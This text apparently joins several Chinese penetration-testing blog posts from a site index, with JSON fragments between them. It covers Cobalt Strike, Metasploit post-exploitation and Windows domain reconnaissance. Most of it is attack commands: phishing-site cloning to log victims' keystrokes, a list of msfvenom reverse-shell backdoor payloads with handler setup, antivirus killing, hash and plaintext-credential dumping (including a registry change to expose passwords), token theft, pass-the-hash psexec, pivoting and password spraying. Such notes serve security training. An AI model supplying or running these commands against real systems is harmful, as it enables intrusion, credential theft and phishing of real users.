windows dll 文件\n\n\nwindows dll 文件：\n\n\n在 windows 的 system 文件夹下有一个 regsvr32.exe 的程序，它就是 windows 自带的 activex 注册和反注 册工具。(activex 不注册是不能够被系统识别和使用的，一般安装程序都会自动地把它所使用的 activex 控件注册)。Regsvr32 命令用于注册 COM 组件，是 Windows 系统提供的用来向系统注册控件或者卸载 控件的命令，以命令行方式运行。\n\n\nregsvr32\n&quot;regsvr32 [&#x2F;s] [&#x2F;n] [&#x2F;i(:cmdline)] dllname”。\n其中dllname为activex控件文件名，建议在安装前拷贝到system文件夹下。\n参数有如下意义：\n&#x2F;u——反注册控件（卸载com组建）\n&#x2F;s——不管注册成功与否，均不显示提示框（静默模式，不弹框）\n&#x2F;c——控制台输出\n&#x2F;i——跳过控件的选项进行安装(传给DllInstall的参数内容，regsvr32 允许注册过程中 dll 进行一些自定义的安装过程，该过程在 DllInstall 中实现。)\n&#x2F;n——不注册控件，此选项必须与&#x2F;i选项一起使用\nScrobj.dll:com服务器，全名Windows Script Component,DllInstall方法在这个组件中实现。\n\n\n\n\n\n\n#执行文件\nc:\\Windows\\System32\\regsvr32.exe C:\\Windows\\Temp\\artifact.dll\n\n\n# 5、Web 钓鱼模块\nManage 对开启的web服务进行管理；\nClone Site 克隆网站，可以记录受害者提交的数据；\nHost File 提供一个文件下载，可以修改Mime信息；\nScripted Web Delivery 类似于msf 的web_delivery ;\nSigned Applet Attack 使用java自签名的程序进行钓鱼攻击;\nSmart Applet Attack 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本；\nSystem Profiler 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。\n# 5.1 站点管理\n\n凡是使用 web 钓鱼进行文件托管或生成的 powershell payload 等都会在 web 站点管理中有记录，可进行复制 URL、删除等操作\n添加了 IP 和端口的记录可进行访问下载文件\n\n\n# 5.2 克隆网站\n\n克隆网站可以克隆一个登录页面记录受害者的键盘输入，也可以附加文件，受害者在访问该网站时会自动下载文件进行上线\n如：某人博客，下图为正常网站 URL\n\n\n\n生成克隆站点\n\n\n\n访问后可抓取键盘输入（在视图 ----web 日志中查看）\n\n\n# 6、邮件钓鱼\n\n首先需要准备一个.eml 的钓鱼模板，可在邮箱中直接导出\n\n\n\n准备好 eml 文件后，参数设置如下\n\n目标：目标邮箱，使用文件一个一行以列表形式加载\n模板：保存的eml文件\n附件：打开邮件后下载的文件，可以放后门木马\n嵌入url：将邮件中的原有连接替换为需要的连接\n邮件服务器：使用的邮箱的服务器\n\n\n\n发送的钓鱼邮件如下，此时由于设置了嵌入 url 选项，点击这个链接会跳转到 baidu\n\n\n# 7、beacon 的使用\n\n\nBeacon 是 Cobalt Strike 为高级攻击者建模的 Payload。使用 Beacon 通过 HTTP，HTTPS 或 DNS 出口网络。而且 Beacon 非常灵活，支持异步和交互式通信。异步通信既低又慢。Beacon 将通讯本地，下载任务，然后进入睡眠状态。交互式通信实时发生。\n\n\n主机上线后右键主机选择交互会话打开 beacon 命令行\n\n\n# 7.1 beacon 的命令\n\n在 beacon 会话中使用 help  可查看帮助文档，help command 可查看具体命令帮助\n\nCommand Description\n------- -----------\nargue 命令行参数欺骗\nblockdlls 禁止子进程加载非微软签名的dll\nbrowserpivot 注入浏览器进程代理用户已认证身份（仅支持IE）\ncancel 取消正在下载的文件\ncd 跳转目录\ncheckin 强制目标回连并更新状态（用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver）\nchromedump 提取Chrome保存的账号密码、Cookies等信息\nclear 清空beacon任务队列\nconnect 通过TCP正向连接远程Beacon\ncovertvpn 部署Covert VPN客户端\ncp 复制文件\ndcsync 从域控提取密码hash\ndesktop 远程VNC控制用户桌面\ndllinject 注入一个内存反射加载的dll到目标进程\ndllload 使用LoadLibrary方式在目标进程中加载一个dll\ndownload 下载文件\ndownloads 列出所有正在下载的文件\ndrives 列出所有磁盘盘符\nelevate 利用提权漏洞获取一个高权限Beacon\nexecute 在目标上执行程序（无回显）\nexecute-assembly 在目标上内存加载执行本地.NET程序\nexit 结束当前Beacon会话\ngetprivs 在当前进程访问令牌（access token）中启用system特权\ngetsystem 尝试获取SYSTEM用户权限\ngetuid 获取当前进程访问令牌（access token）的用户信息\nhashdump 获取本地用户hash\nhelp 帮助信息\ninject 在指定进程中注入新的Beacon会话\ninline-execute 在当前会话中执行Beacon Object File\njobkill 结束一个后台任务\njobs 列出所有后台任务\njump 在远程机器上植入Beacon（横向移动）\nkerberos_ccache_use 从ccache文件导入kerberos票据到当前会话中\nkerberos_ticket_purge 清空当前会话中的所有kerberos票据\nkerberos_ticket_use 从ticket文件中导入kerberos票据到当前会话中\nkeylogger 开启键盘记录\nkill 结束指定进程\nlink 通过命名管道正向连接远程Beacon\nlogonpasswords 使用mimikatz获取密码和hash\nls 列出目录文件\nmake_token 创建进程访问令牌（access token），仅用于访问网络资源\nmimikatz 运行mimikatz\nmkdir 创建目录\nmode dns 使用DNS A记录作为数据通道（仅支持DNS上线Beacon）\nmode dns-txt 使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）\nmode dns6 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）\nmv 移动文件\nnet 网络和主机探测工具（内置net命令）\nnote 给当前会话添加备注信息\nportscan 网络端口扫描\npowerpick 内存执行Powershell命令（不调用powershell.exe）\npowershell 通过powershell.exe执行Powershell命令\npowershell-import 导入本地powershell脚本到当前会话中\nppid 为所有新运行的进程设置伪造的父进程PID\nprintscreen 使用PrintScr方式截屏\nps 显示进程列表\npsinject 注入到指定进程后在内存中执行Powershell命令（不调用\npowershell.exe)\npth 使用Mimikatz执行Pass-the-hash\npwd 显示当前目录\nreg 查询注册表\nremote-exec 在远程机器上执行命令（横向移动）\nrev2self 恢复原始进程访问令牌（access token）\nrm 删除文件或文件夹\nrportfwd 反向端口转发（从Cobalt Strike Teamserver发起连接）\nrportfwd_local 反向端口转发（从Cobalt Strike客户端发起连接）\nrun 在目标上执行程序（有回显）\nrunas 以另一个用户身份执行程序\nrunasadmin 以高权限执行程序\nrunu 以另一个进程PID作为父进程PID，并以其用户身份执行程序\nscreenshot 截屏\nscreenwatch 屏幕监控，每隔一段时间截屏\nsetenv 设置环境变量\nshell 使用cmd.exe执行命令\nshinject 注入shellcode到指定进程中\nshspawn 创建傀儡进程并注入shellcode到其中运行\nsleep 设置beacon回连间隔时间\nsocks 启动SOCKS4a代理服务器\nsocks stop 停止SOCKS4a代理服务器\nspawn 创建一个新Beacon会话\nspawnas 以另一个用户身份创建一个新Beacon会话\nspawnto 设置创建新进程时使用的可执行文件路径（傀儡进程的宿主exe文件路径）\nspawnu 以另一个进程PID作为父进程PID，并以其用户身份创建一个新Beacon会话\nspunnel 运行第三方agent shellcode并将其反向代理到控制端（从CobaltStrike Teamserver发起连接）\nspunnel_local 运行第三方agent shellcode并将其反向代理到控制端（从CobaltStrike客户端发起连接）\nssh 通过SSH连接远程主机（使用账号密码认证）\nssh-key 通过SSH连接远程主机（使用证书私钥认证）\nsteal_token 从指定进程中窃取访问令牌（access token)\ntimestomp 复制B文件的创建、访问、修改时间戳到A文件（文件时间戳伪造）\nunlink 断开与beacon的连接（用于通过TCP、命名管道连接的beacon）\nupload 上传文件\n# 7.2 心跳时间\n\nbeacon 的默认心跳时间是 60s，即 60 秒受害机器与服务器进行一次通信，一般在 beacon 中将 sleep 设置为 5，设置为 0 则表示即时通信，使用 socks 代理需要设置 sleep 为 0\nsleep 为 0 时称 beacon 为交互模式\n\n\n# 7.3 执行 cmd 命令\n\n在 beacon 中执行 cmd 命令需要在命令前加 shell ，如 shell ipconfig\n\n\n# 7.4 截图\n\n在上线主机中右键浏览探测 -&gt; 屏幕截图或直接在 beacon 中输入 screenshot  可进行屏幕截图\n截图结果在视图 -&gt; 屏幕截图中查看\n\n\n\n# 7.5 端口扫描\n\n右键主机，浏览探测 -&gt; 端口扫描进行端口扫描\n可以选择主机上的指定网卡进行网段扫描\n\n\n\n# 7.6 网络探测\n\nbeacon 提供 net  命令进行网络探测， help net  查看命令帮助\n\nUse: net [命令] [参数]\nBeacon内置的主机和网络枚举探测工具。 支持的 [命令] 列表有：\n    命令 描述\n    ------- -----------\n    computers 列出域中的主机（通过组）\n    domain 显示该主机的域\n    dclist 列出域控制器\n    domain_controllers 列出域控制器（通过组）\n    domain_trusts 列出域信任\n    group 列出组中的成员组和成员用户\n    localgroup 列出本地组中的成员组和成员用户\n    logons 列出登录到指定主机的用户\n    sessions 列出指定主机上的会话\n    share 列出指定主机上的共享\n    user 列出用户和用户信息\n    time 显示指定主机上的时间\n    view 列出域中的主机（通过browser服务）\n使用 &quot;help net [命令]&quot; 了解更多信息\n\nnet view  查看域中的主机\n\n\n\nnet dclist  列出域控\n\n\n# 7.7 浏览器代理\n\njquery c2\nmalleable-c2-master\n\n","slug":"CobaltStrike","date":"2022-10-06T14:02:27.000Z","categories_index":"web安全","tags_index":"web安全,内网渗透","author_index":"cCor4ng3"},{"id":"11f36b4318769a873345492b90cb8350","title":"Metasploit内网篇","content":"#常用命令\nsessions -K 结束全部会话\n# 1、数据库后端\n关于数据库操作：\ndb_connect\ndb_disconnect\ndb_export\ndb_import\ndb_nmap\ndb_rebuild_cache\ndb_remove\ndb_save\ndb_status\n\n\n启动 postgresql 数据库\n\nsudo service postgresql start #启动服务\nsudo service postgresql status #查看服务状态\nsudo netstat -antpo #查看端口\nsudo msfdb init #初始化数据库\nsudo msfdb reinit #重新初始化数据库\n# 数据库初始化成功后会产生一个/usr/share/metasploit-framework/config/database.yml文件\n\n注意究极大坑：postgresql 需要在环境为 en-US 情况下使用，否则会无法开启 5432 监听，解决方法为修改 terminal 编码或者系统语言\n\n\n\n\n使用 msfconsole 的 db_connection 连接数据库\n\nmsf6 > db_connect -y /usr/share/metasploit-framework/config/database.yml #使用数据库文件进行连接\nmsf6 > db_status #查看连接状态\n\n\n使用 db_nmap 对主机进行扫描，db_nmap 和 nmap 的使用方法相同\n\nmsf6 > db_nmap 10.10.10.135 -sV -A #对常用端口进行扫描\nmsf6 > services #查看已存在的db_nmap服务，可查看所有扫描结果\nmsf6 > services --help #查看帮助手册\nmsf6 > services -d IP #删除指定IP的扫描记录\nmsf6 > db_nmap 10.10.10.0/24 -p 445 #扫描C段445端口\n\n\n\n\nhosts 查看已扫描过的 IP\n\nmsf6 > hosts #查看已扫描过的IP\n\n# 1.2 配合 db_autopwn 对主机实现自动攻击\n\ndb_autopwn：GitHub - hahwul/metasploit-autopwn: db_autopwn plugin of metasploit\n将文件上传到 kali 桌面，执行 cp 命令导入到 msf 目录下\n\ncp db_autopwn.rb /usr/share/metasploit-framework/plugins\n\n使用 msf 导入插件\n\nmsf6 > load db_autopwn\n\n使用 autopwn 进行攻击\n\nmsf6 > db_autopwn #查看帮助文档\nmsf6 > db_autopwn -p -R great -e -q IP #指定IP进行扫描\nmsf6 > db_autopwn -p -R great -e -q #如果不指定IP，默认扫描hosts已存的所有主机\n# 因为有防火墙的原因，建议使用指定EXP攻击指定端口服务\ndb_autopwn -p -m exploit/windows/smb/ms17_010_eternalblue -e #指定模块进行攻击\n# 2、msf 生成后门\n# 2.1 msfvenom\n\n\nmsfvenom：攻击载荷生成和编码器\n#主要参数\n-p payload-e 编码方式-i 编码次数-b 在生成的程序中避免出现的值LHOST,LPORT 监听\n上线的主机IP和端口-f exe 生成EXE格式使用msfvenom -l 可以查看可以利用payloadmsfvenom -l\n| grep windows | grep x64 | grep tcp 选择payload\n\n\n# 2.2 生成可执行文件\n\n后门 payload 大全\n\n#Linux:\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f elf > shell.elf\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f elf > shell.elf\n#Windows:\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;YourPort to Connect On> -f exe > shell.exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;YourPort to Connect On> -f exe > shell.exe\n#Mac:\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f macho > shell.macho\nmsfvenom -p osx/x64/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f macho > shell.macho\n#PHP:\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.php\ncat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' > shell.php &amp;&amp; pbpaste >> shell.php\n#ASP:\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your\nPort to Connect On> -f asp > shell.asp\n#JSP:\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.jsp\n#WAR:\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f war > shell.war\n#Python:\nmsfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.py\n#Bash:\nmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.sh\n#Perl:\nmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw > shell.pl#\n# 2.3 开启监听\nmsfconsole\nmsf6 > use exploit/multi/handler #使用监听模块\nmsf6 exploit(multi/handler) > show options #查看参数\nmsf6 exploit(multi/handler) > show advanced #查看高级参数\nmsf6 exploit(multi/handler) > set lport 4444 #设置监听端口\nmsf6 exploit(multi/handler) > set lhost 10.10.10.132 #设置监听IP\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp #设置payload，与2.2生成文件的payload相同\nmsf6 exploit(multi/handler) > exploit #执行监听\n\n# 2.4 扩展监听命令\nmsf6 exploit(multi/handler) > exploit -j -z #-j：将会话作为job开始运行，可执行jobs查看所有会话；-z：不立即执行session交换，可后台运行\nmsf6 exploit(multi/handler) > set ExitOnSession false #让connection保持连接(即使一个连接退出,仍然保持listening状态)\nmsf6 exploit(multi/handler) > set PrependMigrate true #自动添加新进程\n#启动msf时自动开启监听\nmsfconsole -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_http; set lhost 127.0.0.1; set lport 1234; exploit -j;\"\n\n# 2.5 会话操作\nmeterpreter > background #将会话放置到后台\nmsf6 exploit(multi/handler) > sessions #查看所有会话\nmsf6 exploit(multi/handler) > sessions 1 #选择指定会话\nmsf6 exploit(multi/handler) > sessions -k 1 #结束指定会话\nCtrl+z #把会话放到后台\nCtrl+c #结束会话\n# 3、Meterpreter 后渗透\nmeterpreter > background 放回后台\nmeterpreter > exit 关闭会话\nmeterpreter > help 帮助信息\nmeterpreter > Sysinfo 系统平台信息\nmeterpreter > screenshot 屏幕截取\nmeterpreter > shell 命令行shell (exit退出)\nmeterpreter > getlwd 查看本地目录\nmeterpreter > lcd 切换本地目录\nmeterpreter > pwd 查看目录\nmeterpreter > ls 查看文件目录列表\nmeterpreter > cd 切换目录\nmeterpreter > rm 删除文件\nmeterpreter > download C:\\\\Users\\\\123\\\\Desktop\\\\1.txt 1.txt 下载文件\nmeterpreter > upload /var/www/wce.exe wce.exe 上传文件\nmeterpreter > search -d c: -f *.doc 搜索文件\nmeterpreter > execute -f cmd.exe -i 执行程序/命令\nmeterpreter > ps 查看进程\nmeterpreter > run post/windows/capture/keylog_recorder 键盘记录\nmeterpreter > getuid 查看当前用户权限\nmeterpreter > use priv 加载特权模块\nmeterpreter > getsystem 提升到SYSTEM权限\nmeterpreter > hashdump 导出密码散列\nmeterpreter > ps 查看高权限用户PID\nmeterpreter > steal_token &lt;PID> 窃取令牌\nmeterpreter > rev2self 恢复原来的令牌\nmeterpreter > migrate pid 迁移进程\nmeterpreter > run killav 关闭杀毒软件\nmeterpreter > run getgui-e 启用远程桌面\nmeterpreter > portfwd add -l 1234 -p 3389 -r &lt;目标IP> 端口转发\nmeterpreter > run get_local_subnets 获取内网网段信息\nmeterpreter > run autoroute -s &lt;内网网段> 创建自动路由\nmeterpreter > run autoroute -p 查看自动路由表\n创建代理通道:\nmsf > use auxiliary/server/socks4a 设置socks4代理模块\nmsf auxiliary(socks4a) > show options\nmsf auxiliary(socks4a) > run\n配置proxychains参数：\nnano /etc/proxychains.conf 修改代理监听端口,和前面端口一致\nquite_mode 设置成安静模式：去掉如下参数前面的注释\n# 3.1 常用命令\nmeterpreter > run post/windows/capture/keylog_recorder #记录键盘，CTRL+C结束后会保存到一个txt文件中\nmeterpreter > screenshot #屏幕截取\nmeterpreter > hashdump #导出密码散列\nmeterpreter > run hashdump #导出密码散列\n# 3.2 kiwi 使用\nmeterpreter > load kiwi #导入kiwi模块\nmeterpreter > kiwi --help #查看帮助手册\nmeterpreter > creds_all #导出所有凭证\ncreds_all：列举所有凭据\ncreds_kerberos：列举所有kerberos凭据\ncreds_msv：列举所有msv凭据\ncreds_ssp：列举所有ssp凭据\ncreds_tspkg：列举所有tspkg凭据\ncreds_wdigest：列举所有wdigest凭据\ndcsync：通过DCSync检索用户帐户信息\ndcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID\ngolden_ticket_create：创建黄金票据\nkerberos_ticket_list：列举kerberos票据\nkerberos_ticket_purge：清除kerberos票据\nkerberos_ticket_use：使用kerberos票据\nkiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令\nlsa_dump_sam：dump出lsa的SAM\nlsa_dump_secrets：dump出lsa的密文\npassword_change：修改密码\nwifi_list：列出当前用户的wifi配置文件\nwifi_list_shared：列出共享wifi配置文件/编码\n\ncreds_all #该命令可以列举系统中的明文密码\nkiwi_cmd\nkiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令\nkiwi_cmd sekurlsa::logonpasswords #类似mimikatz获取全部信息\n\n提示：在 Windows2012 系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取。\n\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f\n# 3.3 windows shell 乱码解决\n\n进入 shell 后使用  chcp 65001  解决\n\n# 3.4 psexec 登录内网主机\n\n连接 meterpreter 后门后进程迁移或提权到 system，使用 hashdump 导出 hash\n\nmeterpreter > migrate 334\nmeterpreter > hashdump\n\n使用 smb_version 或在 meterpreter 中 run 搜索模块进行 445 端口扫描\n使用 exploit/windows/smb/psexec  模块进行攻击\n\ninfo exploit/windows/smb/psexec #查看模块信息\nuse exploit/windows/smb/psexec #使用模块\nshow options #查看选项\nuse exploit/windows/smb/psexec #设置payload\nset SMBUser administrator #设置攻击用户\nset rhosts 10.10.10.135 #设置攻目标IP，可设置C段\nset smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 #设置hash\nset payload windows/meterpreter/reverse_tcp #设置payload\nset lhost 10.10.10.139 #设置监听主机IP\nset lport 6666 #设置监听端口\nexploit\n# 3.5 开启远程终端\n\ngetgui 模块 —— 用于开启远程终端\n\nmeterpreter > run getgui -e #开启远程终端\nmeterpreter > run post/windows/manage/enable_rdp\nmeterpreter > run getgui -u m -p QWEasd123 #添加本地用户，再手动添加管理员\nrdesktop 127.0.0.1:1234 #连接目标IP远程终端\n# 3.6 端口转发\n\n如果目标主机在开启防火墙的情况下，有可能拦截远程终端端口（3389），使用 msf 将 3389 端口转发出来\n模块：portfwd\n\nmeterpreter > help portfwd\nrdesktop 10.10.10.138 #开启防火墙后无法连接\nmeterpreter > netstat #查看目标端口，发现开启3389并且处于监听状态，但由于防火墙拦截无法连接\n\n转发 3389\n\nmeterpreter > portfwd add -l 1234 -p 3389 -r 受害者主机IP #将3389端口转发到攻击机本地的1234端口上\nmeterpreter > portfwd list #查看转发的列表\nrdesktop 127.0.0.1:1234 #连接本地1234端口即连接受害者3389\nmeterpreter > portfwd flush #清空转发列表\n# 3.7 跨路由访问\n\n在渗透测试过程中，经常拿到 web 主机与数据库不同在一个网段，可以得出这台主机还连着一个内网， 如果想要继续渗透内网，可以把这台 web 主机当作跳板机，对内网进行渗透\n\n\n\n\nkali 无法直接访问目标主机，但是 kali 拿下受害者后发现受害者可以访问目标主机，所以可以通过受害者做跳板访问目标主机\n\n\n使用 msf 生成后门并连接\n\n\n连接后 kali 使用的是桥接模式，windoes server 5 有两块网卡，一块是桥接，另一块是 10.10.10 的仅主机模式的内网网卡，连接到 windows server5 后可 arp_scan 扫描 10 网段的主机，但是在 kali 中直接 ping 是无法访问的\n\n\n\n\n获取受害者主机网卡\n\nmeterpreter > run get_local_subnets \n\n\n绑定路由\n\nmeterpreter > run autoroute -s 10.10.10.0/24 #将本机和10网段进行绑定\nmeterpreter > run autoroute -p #查看已绑定的路由表\nmsf6 exploit(multi/handler) > route add 10.10.10.0 255.255.255.0 1 #最后的1是指session，要先将session放到后台\nmsf6 exploit(multi/handler) > route print #查看已绑定的路由表，要先将session放到后台\n\n\n使用 socks_proxy 开启隧道\n\nmsf6 exploit(multi/handler) > use auxiliary/server/socks_proxy #直接使用默认端口和版本即可\nmsf6 auxiliary(server/socks_proxy) > exploit #默认以jobs的方式后台运行\nmsf6 auxiliary(server/socks_proxy) > jobs #查看运行的socks\n\n编辑本地隧道代理文件\n\n$ sudo vi /etc/proxychains4.conf\n#将最后一行改为 socks5 本地IP 端口\n\n\n这时就可以通过 proxychains4 工具跨路由访问\n\nproxychains4 nmap 10.10.10.144 -sT -A -p 445\n\n\n在 msf 中设置代理\n\nsetg Proxies socks4/5:ip:port #让msf所有模块的流量都通过此代理走。(setg全局设置)\nmsf6 exploit(windows/smb/psexec) > setg Proxies socks5:10.189.0.249:1080\nmsf6 exploit(windows/smb/psexec) > set ReverseAllowProxy true #允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)\n\n之后可在 msf 中使用模块并访问到目标主机\n\n\nmsf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/bind_tcp #reverse是反向连接，bind是正向连接\npayload => windows/meterpreter/bind_tcp\nmsf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4\nsmbpass => aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4\nmsf6 exploit(windows/smb/psexec) > exploit \n\n\n# 3.8 域信息收集\n# 3.8.1 常用信息收集模块\n\n收集端口信息\n\nauxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep #基于arp协议发现内网存活主机，这不能通过代理使用\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口\nauxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp #基于tcp进行端口扫描，默认扫描1-10000端口\nauxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep #基于udp协议发现内网存活主机\nauxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe #基于udp协议发现内网存活主机\nauxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname #基于netbios协议发现内网存活主机\nauxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version #发现内网ftp服务，基于默认21端口\nauxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version #发现内网ssh服务，基于默认22端口\nauxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version #发现内网telnet服务，基于默认23端口\nauxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp #发现dns服务，基于默认53端口\nauxiliary&#x2F;scanner&#x2F;http&#x2F;http_version #发现内网http服务，基于默认80端口\nauxiliary&#x2F;scanner&#x2F;http&#x2F;title #探测内网http服务的标题\nauxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version #发现内网smb服务，基于默认的445端口\nuse auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口\nuse auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_hashdump #发现内网oracle服务,基于默认的1521端口\nauxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version #发现内网mysql服务，基于默认3306端口\nauxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner #发现内网RDP服务，基于默认3389端口\nauxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_server #发现内网Redis服务，基于默认6379端口\nauxiliary&#x2F;scanner&#x2F;db2&#x2F;db2_version #探测内网的db2服务，基于默认的50000端口\nauxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname\n\n收集域信息\n\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #查看登录过的用户信息\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_ad_groups #查看组信息\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_domain #定位域控\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_ad_computers #域内所有机器\nuse post&#x2F;windows&#x2F;gather&#x2F;enum_patches #发现缺失的补丁\nuse post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester #快速识别可能被利用的漏洞\nrun post&#x2F;windows&#x2F;manage&#x2F;migrate #自动进程迁移\nrun post&#x2F;windows&#x2F;gather&#x2F;checkvm #查看目标主机是否运行在虚拟机上\nrun post&#x2F;windows&#x2F;manage&#x2F;killav #关闭杀毒软件\nrun post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面服务\nrun post&#x2F;windows&#x2F;manage&#x2F;autoroute #查看路由信息\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #列举当前登录的用户\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_applications #列举应用程序\nrun post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin #抓取自动登录的用户名和密码\nrun post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump #dump出所有用户的hash\nrun post&#x2F;windows&#x2F;gather&#x2F;enum_domain_tokens #寻找域token\n# 3.8.2 tcp 端口扫描\n\n由于 3.7 已经设置了代理，可直接用跳板扫描 10.10.10 网段\n\nmsf6 exploit(windows/smb/psexec) > use auxiliary/scanner/portscan/tcp\nmsf6 auxiliary(scanner/portscan/tcp) > set rhosts 10.10.10.1/24\nmsf6 auxiliary(scanner/portscan/tcp) > set ports 445\nmsf6 auxiliary(scanner/portscan/tcp) > exploit\n\n# 3.9 密码喷射\n\n探测存在的用户\n\nmsf6 auxiliary(scanner/portscan/tcp) > use auxiliary/gather/kerberos_enumusers\nmsf6 auxiliary(gather/kerberos_enumusers) > set domain redteam.club\ndomain => redteam.club\nmsf6 auxiliary(gather/kerberos_enumusers) > set rhosts 10.10.10.136 #设置域控IP\nrhosts => 10.10.10.136\nmsf6 auxiliary(gather/kerberos_enumusers) > set user_file ~/Desktop/user #设置用户名字典\nuser_file => ~/Desktop/user\n\n\n\n对多个 IP 指定用户猜解密码\n\nuse auxiliary/scanner/smb/smb_login\nset user_file #用户名文件\nset sbmpass #明文密码\nset rhosts #攻击IP，可以是一个网段\nset smbdomain #域\n\n\n# 3.10 令牌登录\n\n需要本地管理员权限才能看到凭证和 ps 信息，才能进行窃取和注入进程\n如果开启了代理无法启动监听，执行：\n\nset ReverseAllowProxy true\nmeterpreter > load incognito #加载incognito模块\nmeterpreter > list_tokens -u #列出当前系统可用的token\nmeterpreter > impersonate_token 'NT AUTHORITY\\SYSTEM' #假冒SYSTEM token\nmeterpreter > impersonate_token NT AUTHORITY\\SYSTEM #参数不加单引号需要对特殊字符进行转义\nmeterpreter > rev2self #返回原始token\n\n# 3.11 steal_token 窃取令牌\nmeterpreter > ps #查看系统进程信息\nmeterpreter > steal_token &lt;pid值> #从指定进程中窃取token\nmeterpreter > drop_token #删除窃取的token\n\n# 3.12 msf 使用 kiwi 导出票据\n\n导出票据需要 system 权限\n\nmeterpreter > load kiwi #加载kiwi模块\nmeterpreter > creds_msv #列出可用的ntlm\nmeterpreter > dcsycn_ntlm redteam\\\\administrator #通过NTLM进行切换身份\nmeterpreter > dcsycn readteam\\\\administrator\n# 3.13 MS 14-086\n\n域控为 windows server 2008 时使用\n\n\n#参数说明\n-domain：域名\n-password：普通域用户密码\n-rhosts：域控主机名.域名\n-rport：域控端口（默认）\n-user：普通域用户\n-user_sid：域普通用户SID\n","slug":"Metasploit内网篇","date":"2022-10-06T14:00:44.000Z","categories_index":"web安全","tags_index":"web安全,内网渗透","author_index":"cCor4ng3"},{"id":"b763bab809532eb18f1e59a115b4ee11","title":"域渗透小结","content":"# 域渗透\n\n常用命令总结\n\nklist #查看当前存储的票证\nnet view &#x2F;domain:domainame #查询域内主机\n# 1、域基本信息、域控收集\n\n\n使用 systeminfo 命令，当主机在域中时，会显示所在的域\nsysteminfo\n\n\n\n使用 net time /domain 查看域控\nnet time /domain\n\n\n\n使用 net view 查看有几个域，但是一般会出错\nnet view\n\n\n\n确定域控主机的 IP\nnltest /dclist:moonsec\t#查看域控\nping 域控主机名 \t#查看域控地址\n\n\n\n其他信息收集命令\n\n\nipconfig &#x2F;all #查询当前环境，可根据DNS后缀搜索列表查看域控\nnet user &#x2F;domain #查询当前域用户\nnet time #查询域控\nnet group &#x2F;domain #查询域工作组\nnet group &quot;domain admins&quot; &#x2F;domain 